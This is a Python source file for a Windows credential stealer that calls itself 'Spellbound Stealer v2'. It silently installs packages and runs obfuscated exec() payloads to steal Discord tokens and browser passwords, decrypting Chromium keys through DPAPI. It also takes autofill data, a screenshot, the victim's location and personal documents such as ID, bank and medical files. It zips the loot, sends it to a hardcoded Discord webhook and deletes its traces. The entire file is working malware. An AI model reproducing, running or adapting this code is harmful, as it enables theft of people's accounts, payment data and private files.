import os                                                                                                                                                                                                                                                                                                                     
import re
import sys
import time
import json
import uuid
import ctypes
import base64
import shutil
import socket
import base64
import sqlite3
import zipfile
import platform
import subprocess

debug = False


userHomePath = f"C:\\Users\\{os.getlogin()}"

basePath = f"C:\\Users\\{os.getlogin()}\\bin"

zipPath = os.path.join(basePath, os.getlogin()+".zip")

softwareLogsPath = os.path.join(basePath, ".execution logs.txt")
passwordsPath = os.path.join(basePath, ".passwords.txt")
autofillPath = os.path.join(basePath, ".auto-fill.txt")
discordPath = os.path.join(basePath, ".discord.txt")
screenshotPath = os.path.join(basePath, ".screenshot.png")
stolenFilesFolderPath = f"C:\\Users\\{os.getlogin()}\\bin\\Files"

try:
    os.mkdir(basePath)
except Exception as e:
    pass

try:
    os.mkdir(stolenFilesFolderPath)
except Exception as e:
    pass

logging = open(softwareLogsPath, "w")

LOCALAPPDATA = os.getenv('LOCALAPPDATA')
ROAMING = os.getenv('APPDATA')

discordRegexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
discordRegexpEnc = r"dQw4w9WgXcQ:[^\"]*"
discordTokens = []
discordUIDS = []
discordCommonPaths = {'Discord': ROAMING + '\\discord\\Local Storage\\leveldb\\','Discord Canary': ROAMING + '\\discordcanary\\Local Storage\\leveldb\\','Lightcord': ROAMING + '\\Lightcord\\Local Storage\\leveldb\\','Discord PTB': ROAMING + '\\discordptb\\Local Storage\\leveldb\\','Opera': ROAMING + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\','Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\','Amigo': LOCALAPPDATA + '\\Amigo\\User Data\\Local Storage\\leveldb\\','Torch': LOCALAPPDATA + '\\Torch\\User Data\\Local Storage\\leveldb\\','Kometa': LOCALAPPDATA + '\\Kometa\\User Data\\Local Storage\\leveldb\\','Orbitum': LOCALAPPDATA + '\\Orbitum\\User Data\\Local Storage\\leveldb\\','CentBrowser': LOCALAPPDATA + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\','7Star': LOCALAPPDATA + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\','Sputnik': LOCALAPPDATA + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\','Vivaldi': LOCALAPPDATA + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\','Chrome SxS': LOCALAPPDATA + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\','Chrome': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\','Chrome1': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\','Chrome2': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\','Chrome3': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\','Chrome4': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\','Chrome5': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\','Epic Privacy Browser': LOCALAPPDATA + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\','Microsoft Edge': LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\','Uran': LOCALAPPDATA + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\','Yandex': LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\','Brave': LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\','Iridium': LOCALAPPDATA + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}

browsersPasswords = []
browserAutofill = []
chromiumBrowsers = [{"name": "Google Chrome", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data"), "taskname": "chrome.exe"},{"name": "Microsoft Edge", "path": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data"), "taskname": "msedge.exe"},{"name": "Opera", "path": os.path.join(ROAMING, "Opera Software", "Opera Stable"), "taskname": "opera.exe"},{"name": "Opera GX", "path": os.path.join(ROAMING, "Opera Software", "Opera GX Stable"), "taskname": "opera.exe"},{"name": "Brave", "path": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data"), "taskname": "brave.exe"},{"name": "Yandex", "path": os.path.join(ROAMING, "Yandex", "YandexBrowser", "User Data"), "taskname": "yandex.exe"},]
chromiumSubpaths = [{"name": "None", "path": ""},{"name": "Default", "path": "Default"},{"name": "Profile 1", "path": "Profile 1"},{"name": "Profile 2", "path": "Profile 2"},{"name": "Profile 3", "path": "Profile 3"},{"name": "Profile 4", "path": "Profile 4"},{"name": "Profile 5", "path": "Profile 5"},]

fileStealerPaths = [f"{userHomePath}/Desktop", f"{userHomePath}/Documents", f"{userHomePath}/Downloads"]
fileStealerExtensions = [".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx", ".odt", ".ods", ".bat", ".py", ".db", ".csv"]
fileStealerName = ["passeport", "certificat", "identite", "diplome", "rib", "cv", "motivation", "medical", "passe", "password", "credential", "login", "chrome", "firefox", "token", ""]
fileMaxSize = 4194304
filesToSteal = []

totalDiscordToken = 0
totalPasswords = 0
totalAutofills = 0
totalFiles = 0


def XorString(input_string: str, key: str) -> str:
    extended_key = (key * (len(input_string) // len(key) + 1))[:len(input_string)]
    xor_result = ''.join(chr(ord(a) ^ ord(b)) for a, b in zip(input_string, extended_key))
    return xor_result

def GetTime():
    return time.strftime("%H:%M:%S", time.localtime())

def GetPython():
    global logging
    commands = ["py", "python", "python3"]
    for cmd in commands:
        try:
            result = subprocess.run([cmd, "--version"], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
            logging.write(f"{GetTime()} [python] - Python command found : {cmd}\n")
            return cmd
        except (subprocess.CalledProcessError, FileNotFoundError):
            continue

    return None

def InstallPackages(packages):
    pythonCmd = GetPython()
    for package in packages:
        subprocess.run([pythonCmd, "-m", "pip", "install", package], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        logging.write(f"{GetTime()} [pip] - Package {package} has been installed\n")

def KillProcess(processName):
    result = subprocess.run(["tasklist"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
    if processName not in result.stdout:
        return

    subprocess.run(["taskkill", "/F", "/IM", processName], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
    logging.write(f"{GetTime()} [KillProcess] - Process {processName} has been terminated\n")

def ListFileInDir(directory, maxDepth=1):
    finalFiles = []
    currentDepth = 0

    if currentDepth > maxDepth:
        return finalFiles

    for root, dirs, files in os.walk(directory):
        for file in files:
            finalFiles.append(os.path.join(root, file))

        if currentDepth + 1 > maxDepth:
            dirs.clear()

    return finalFiles

def SafeRemove(path):
    try:
        if os.path.exists(path):
            os.remove(path)
    except Exception as e:
        pass

def AddFolderToZip(zipFile, folderPath, arcBase=""):
    for root, dirs, files in os.walk(folderPath):
        for file in files:
            file_path = os.path.join(root, file)
            arcname = os.path.relpath(file_path, start=folderPath)
            if arcBase:
                arcname = os.path.join(arcBase, arcname)
            zipFile.write(file_path, arcname)


discordPayloadKey = "kzhqksneohjoqzlqnzsgknqzlhzlqnqilusnbqkzsnqznzhnfcunsqbb" 
chromiumPasswordPayloadKey = "heioshbineoqiznighzeqhdsinkbizeknqozgnozqosovnzoqnholznq"
chromiumAutofillPayloadKey = "ndznqkngfzknqkznkdnzkqngkejbsqjbdjebqd nvjznkqnzbngjebjq"

discordPayload = base64.b64decode("YRwHA0sdDwgKREofEA4EUQcUUwMCHRIVHgw5AxwDHgc8FAcGEV8CDhYDAlJHQGJORkNVBxVRDA0fWgcCRQMPEQdGDxcYCRgCRgoSEwNHS1oPBxQYGAAEDGZVU05CLg8TAA0eCApaVU4IAhgLXQMHEgcbCxRDUU5HQ0hITVhUAB4ZHwFPQmRRWkxIEwpRTBIGHhFRTgsfSwoSGhlAZFpITkZDVU5TGARCBRUcUQQAQBUOHAJBFAIFAhoJWzUkLzwzIi9aR1EIVjUXKhcHERIECBcTLTYBGQkCRjABDwcURUtRWgseBQcHCxoNYE9RWkxRTlpTAQQcURwFBB8zHw8cDEwcHU4NAkUWGh0FHgcIQB4HFx1HSXtCQktaSFFLU05FT0gDCVEcBR0LJR0GBgsqV19SJ0wfAQVJBRtTNUAdBB1RQlFYAh4KTDtZVQ0cHxYLBQ8Ne0tTTkVPSEpPUVpMUQgVAUcHBx8fTAEUTCoWXxoYBxoeSlhLHBwcUQJOEwZOCRMQAFsXRRkbGxwZFi8VAwYEDzAfGwEUE11fRw4cAxUeG0dLGAkfBh4QVEdMAw4bFwIYFAsJQEdGChNOC18RFhkTGFlCLlRvT0hKT1FaTFFOWlNHS05RWgoHCEwIThgHTAcWQAQYBR4SAh1SChMbDQkRETwWFgcaGz8GEkdTAgwBDUNVe1pMUU5aU0dLTlFaTEhaTFFOUUlMARwFBx9LR1MqFBkcAxgaMAIZRhEQEQddTkYTXUcKAAwHDgpZA0ICHhYaE0NJFSsbXA1VJgkpCj1PVEc5QDZTX042Hxo3CR0SBgclFghKMCQ7JTglNE5OTw5NMwolCBgdGRwVDxMtNgMLGwBRPQUIGBBUR0t7YVpTTlFaTlpITkZDVU5TUUJCS1pIGA1TOAQDAQ4OBR84HgUfHU8fARofAkFAZlFOUUlMVVNOQlFLWlNOUVpOWkhORkNVTgYYBkJWWhoUGgYLFhsbRAgUDkRWBg4HFxhUXlUIAQkPHhwVRw8aHkEDAQJVBVdeDx0fGh1JIxgLVF1CCg4bDBQZAFMeSCkfGxkVHhgUGwcOBABWQEwcFQcUAAxAQh8AAQxZQiFUBxVdM3BITkZDVU5TUUJCS1pIUUtTTkVPSEpPUVoFF04PGgNLAB4OTAEUTBUHAgoDBxc7KzU4QHlOUVpOWkhORkNVTlNRQkJLWkhRS1NORU9ISk9RHgUCDRUBAz8BGh8CG1QNAR4UBwhdBwEJFAVTeU5RWk5aSE5GQ1VOU1FCQktaSFFLU05FT0hKT1EeBQINFQEDPic1KUIJChwUABVBGRwXR2h7S1pTThQWHR9SZEZDVU5TUUJCDRUaUQ0aAgAwBgsCFFoFH04VAEkHBwIOCAEIRAEPBQFFT3lOQlFLWlNOUVpOWkgHAEMTBx8UPQwKFw0qRkBUOE8GBRtREwJRNVgfCAxMXVpOBB4OUzNLSQ8aHRoLHx4feU5RWk5aSE5GQ1VOUxcNEEsWAR8OUwcLTzMSQQIOHhgeUlpHDQEDWhRIEwJRAQEMAl0VSRkBCg4bEy0BCBMECzkNFAMWDEVOSx8aAwQBHVhIAQ0BHggJVkdUAQIKCh0TAg0JRFhOGA9MDV0dFgMCCltHLEBkWkhORkNVTlNRQkJLWkhRSxUBF08cBQQUFEwYAFoBAkUIGBQICRYAWQoYGg8aAQowFAwfCx5dWgITBgtPWX9OU1FCQktaSFFLU05FT0hKT1FaTBgIWiUGBwcVGxgNLgMaCx9BGBoYCwxYUXBTTlFaTlpITkZDVU5TUUJCS1pIUUtTTkUaAQ5PTFoeFB8PFhQfHV8dCRxSSxkaBRkfT1xBBhgYGRwcFVQNFQVBBxMcQQVITRcYHxoCRDMDAEhESgcUGwgUHAlOHEwvBA4EBwgFCw8FAAMbVFRCBQQRFgAMU0AQGwEIS1w1VBgGRTZwSFFLU05FT0hKT1FaTFFOWlNHS05RWkxIEwpRGxgNTBscGkIYBVoXBwIZAQgMOy8nJlR5UUJCS1pIUUtTTkVPSEpPUVpMUU5aU0dLTlFaTAwTHxIBAw04GhgLDAJFGwMeFBQKUhwBDQYbR3lRQkJLWkhRS1NORU9ISk9RWkxRTlpTR0tOUVpMDBMfEgEDDTk8Nz1MEBsKFgAVUhsTDEds").decode('utf-8')
discordPayload = XorString(discordPayload, discordPayloadKey)

chromiumPasswordPayload = base64.b64decode("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").decode('utf-8')
chromiumPasswordPayload = XorString(chromiumPasswordPayload, chromiumPasswordPayloadKey)

"""
SystemAction.kill_process('chrome.exe')
history_path_part_1_encrypted = base64.b64decode('L0FwcERhdGEvTG9jYWwvR29vZ2xlL0Nocm9tZS9Vc2VyIERhdGEvRGVmYXVsdC9IaXN0b3J5').decode('utf-8')
history_path = f'C:/Users/{os.getlogin()}{history_path_part_1_encrypted}'
conn = sqlite3.connect(history_path)
cursor = conn.cursor()
query_history = base64.b64decode('U0VMRUNUIHVybCwgdGl0bGUsIGxhc3RfdmlzaXRfdGltZSBGUk9NIHVybHMgT1JERVIgQlkgbGFzdF92aXNpdF90aW1lIERFU0M=').decode('utf-8')
cursor.execute(query_history)
rows = cursor.fetchall()
conn.close()
history = []
for row in rows:
    url = row[0]
    title = row[1]
    last_visit_time = datetime(1601, 1, 1) + timedelta(microseconds=row[2])
    history.append((url, title, last_visit_time))

return history
"""


InstallPackages(packages=["requests", "pycryptodome", "pyautogui"])

import requests
import pyautogui
from Crypto.Cipher import AES


requInfos = requests.get('https://ipinfo.io')
data = requInfos.json()

session = os.getlogin()
computer_name = socket.gethostname()
osVersion = platform.system() + " " + platform.release()
architecture = platform.machine()
mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2 * 6, 2)][::-1])
ip = data.get('ip')
country = data.get('country')
region = data.get('region')
city = data.get('city')
loc = data.get('loc')
org = data.get('org')


def ValidateToken(token: str) -> bool:
    r = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token})
    if r.status_code == 200: 
        logging.write(f"{GetTime()} [ext] - Discord token has been validated : {token}\n")
        return True
    return False

def DecryptVal(buff: bytes, master_key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass
    
def GetMasterKey(path: str) -> str:
    if not os.path.exists(path):
        return None
    if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
        return None

    with open(path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]

    pDataIn = DATA_BLOB(len(master_key), ctypes.cast(master_key, ctypes.POINTER(ctypes.c_ubyte)))
    pDataOut = DATA_BLOB()

    if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, None, None, None, 0, ctypes.byref(pDataOut)):
        decrypted_key = bytes((ctypes.c_ubyte * pDataOut.cbData).from_address(ctypes.addressof(pDataOut.pbData.contents)))
        ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
        return decrypted_key

def ExtractInfosFromToken():
    if not discordTokens:
        return

    final_to_return = []
    for token in discordTokens:
        user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
        billing = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()

        username = user['username'] + '#' + user['discriminator']
        user_id = user['id']
        email = user['email']
        phone = user['phone']
        mfa = user['mfa_enabled']

        if user['premium_type'] == 0:
            nitro = 'None'
        elif user['premium_type'] == 1:
            nitro = 'Nitro Classic'
        elif user['premium_type'] == 2:
            nitro = 'Nitro'
        elif user['premium_type'] == 3:
            nitro = 'Nitro Basic'
        else:
            nitro = 'None'

        if billing:
            payment_methods = []
            for method in billing:
                if method['type'] == 1:
                    payment_methods.append('Credit Card')
                elif method['type'] == 2:
                    payment_methods.append('PayPal')
                else:
                    payment_methods.append('Unknown')
            payment_methods = ', '.join(payment_methods)
        else:
            payment_methods = None

        final_message = (f'\nUsername: {username} ({user_id})'
                         f'\nToken: {token}'
                         f'\nNitro: {nitro}'
                         f'\nBilling: {payment_methods if payment_methods != "" else "None"}'
                         f'\nMFA: {mfa}'
                         f'\nEmail: {email if email != None else "None"}'
                         f'\nPhone: {phone if phone != None else "None"}'
                         f'\n==============')
        final_to_return.append(final_message)

    return final_to_return

try:
    exec(discordPayload)

    tokens = ExtractInfosFromToken()
    with open(discordPath, "w", encoding="utf-8") as writer:
        writer.write("========================= Discord =========================\n")
        for token in tokens:
            writer.write(token)
            totalDiscordToken += 1

    logging.write(f"{GetTime()} [discordPayload] - OK\n")
except Exception as e:
    logging.write(f"{GetTime()} [discordPayload] - Payload encountered an error : {e}\n")


def DecryptData(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]

            pDataIn = DATA_BLOB(len(data), ctypes.cast(data, ctypes.POINTER(ctypes.c_ubyte)))
            pDataOut = DATA_BLOB()

            if ctypes.windll.Crypt32.CryptUnprotectData(
                ctypes.byref(pDataIn),
                None,
                None,
                None,
                None,
                0,
                ctypes.byref(pDataOut)
            ):
                decrypted_data = bytes((ctypes.c_ubyte * pDataOut.cbData).from_address(ctypes.addressof(pDataOut.pbData.contents)))
                ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
                return decrypted_data.decode()

        except Exception as e:
            logging.write(f"{GetTime()} [DecryptData] - Function encountered an error : {e}\n")
            return f"Failed to decrypt data: {e}"

try:
    exec(chromiumPasswordPayload)

    formatted = ""
    for entry in browsersPasswords:
        formatted += (
            f"URL:            {entry['url']}\n"
            f"Username:       {entry['username']}\n"
            f"Password:       {entry['password']}\n"
            f"==============\n")
        totalPasswords += 1

    with open(passwordsPath, "w", encoding="utf-8") as writer:
        writer.write("========================= Browsers Passwords =========================\n\n")
        writer.write(formatted)

    logging.write(f"{GetTime()} [chromiumPasswordPayload] - OK\n")
except Exception as e:
    logging.write(f"{GetTime()} [chromiumPasswordPayload] - The payload encountered an error : {e}\n")


try:
    for browser in chromiumBrowsers:
            KillProcess(browser["name"])
            browser_path = browser["path"]
            if not os.path.exists(browser_path):
                continue

            for profile in chromiumSubpaths:
                profile_path = os.path.join(browser_path, profile["path"])
                web_data_path = os.path.join(profile_path, "Web Data")

                if os.path.exists(web_data_path):
                    temp_copy = web_data_path + "_temp"
                    shutil.copy2(web_data_path, temp_copy)

                    try:
                        conn = sqlite3.connect(temp_copy)
                        cursor = conn.cursor()

                        cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
                        tables = [table[0] for table in cursor.fetchall()]
                        if "autofill" in tables:
                            cursor.execute("SELECT name, value FROM autofill")
                            autofills = cursor.fetchall()

                            for autofill in autofills:
                                autofill_entry = (
                                    f'Name: {autofill[0]}\n'
                                    f'Value: {autofill[1]}\n'
                                    f"Browser: {browser['name']}\n"
                                    '==============\n'
                                )
                                browserAutofill.append(autofill_entry)

                        conn.close()
                    except sqlite3.Error as e:
                        pass
                    finally:
                        os.remove(temp_copy)


    with open(autofillPath, "w", encoding="utf-8") as writer:
        writer.write("========================= Browsers Auto-fills =========================\n\n")
        for autofill in browserAutofill:
            writer.write(autofill)
            totalAutofills += 1

    logging.write(f"{GetTime()} [chromiumAutofillPayload] - OK\n")
except Exception as e:
    logging.write(f"{GetTime()} [chromiumAutofillPayload] - The payload encountered an error : {e}\n")



try:
    screenshot = pyautogui.screenshot()
    screenshot.save(screenshotPath)
    totalFiles += 1
    logging.write(f"{GetTime()} [Screenshot] - OK\n")
except Exception as e:
    logging.write(f"{GetTime()} [Screenshot] - The screenshot taken encountered an error : {e}\n")



for path in fileStealerPaths:
    files = ListFileInDir(path)
    
    for file in files:
        if os.path.getsize(file) < fileMaxSize:
            file_name = os.path.basename(file)

            if any(file_name.endswith(ext) for ext in fileStealerExtensions) and \
               any(name in file_name for name in fileStealerName):
                filesToSteal.append(file)

for file in filesToSteal:
    destination = f"{stolenFilesFolderPath}/{os.path.basename(file)}"
    shutil.copy(file, destination)
    totalFiles += 1
    logging.write(f"{GetTime()} [StealFiles] - File copied to the extraction folder : {file}\n")


# C:/Users/<user>/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt

logging.close()


with zipfile.ZipFile(zipPath, "w") as zip_file:
    zip_file.write(passwordsPath, arcname=".passwords.txt")
    zip_file.write(screenshotPath, arcname=".screenshot.png")
    zip_file.write(discordPath, arcname=".discord.txt")
    zip_file.write(autofillPath, arcname=".auto-fill.txt")
    zip_file.write(softwareLogsPath, arcname=".execution logs.txt")
    AddFolderToZip(zip_file, stolenFilesFolderPath, arcBase="Files")


embed = {
    "title": "Spellbound Stealer",
    "color": 0,
    "fields": [
        {"name": ":computer: __System Infos__", "value": f"```ansi\n[2;45m[0m[2;45m[0m[2;35mSession[0m : {session}\n[2;45m[0m[2;45m[0m[2;35mComputer Name[0m : {computer_name}\n[2;45m[0m[2;45m[0m[2;35mOS[0m : {osVersion}\n[2;45m[0m[2;45m[0m[2;35mArchitecture[0m : {architecture}\n[2;45m[0m[2;45m[0m[2;35mMAC[0m : {mac}\n[2;45m[0m[2;45m[0m[2;35mIP[0m : {ip}\n[2;45m[0m[2;45m[0m[2;35mCountry[0m : {country}\n[2;45m[0m[2;45m[0m[2;35mRegion[0m : {region}\n[2;45m[0m[2;45m[0m[2;35mCity[0m : {city}\n[2;45m[0m[2;45m[0m[2;35mLocalisation[0m : {loc}\n[2;45m[0m[2;45m[0m[2;35mInternet Provider[0m : {org}```", "inline": False},
        {"name": ":identification_card: __User Infos__", "value": f"```ansi\n[2;34mDiscord Account[0m : {totalDiscordToken}\n[2;34mPasswords[0m : {totalPasswords}\n[2;34mAuto-fills[0m : {totalAutofills}\n[2;34mStolen Files[0m : {totalFiles}```", "inline": False},
    ],
    "footer": {"text": "Generated by Spellbound Stealer v2 - Free build"}
}
payload = {"embeds": [embed]}


webhook1 = "https://discord.com/api/webhooks/1335193575016628307/Po03xt5JyRDny38YFa80xaylQRKxvYtsDzlcJuBhAJxQRdAlLgeN8EW7jIu3eJFvO8Cc"
webhook2 = "~~"

with open(zipPath, "rb") as zipFileToSend:
    fileReady = {"file": zipFileToSend}
    try:
        response1 = requests.post(webhook1, files=fileReady, data={"payload_json": json.dumps(payload)})
    except Exception as e:
        print("[int] Internal error : 1")

time.sleep(2)

with open(zipPath, "rb") as zipFileToSend:
    fileReady = {"file": zipFileToSend}
    try:
        response2 = requests.post(webhook2, files=fileReady, data={"payload_json": json.dumps(payload)})
    except Exception as e:
        print(f"[ext] Error with the webhook : {e}")

SafeRemove(passwordsPath)
SafeRemove(screenshotPath)
SafeRemove(discordPath)
SafeRemove(autofillPath)
SafeRemove(softwareLogsPath)
SafeRemove(zipPath)
try:
    shutil.rmtree(stolenFilesFolderPath)
except:
    pass
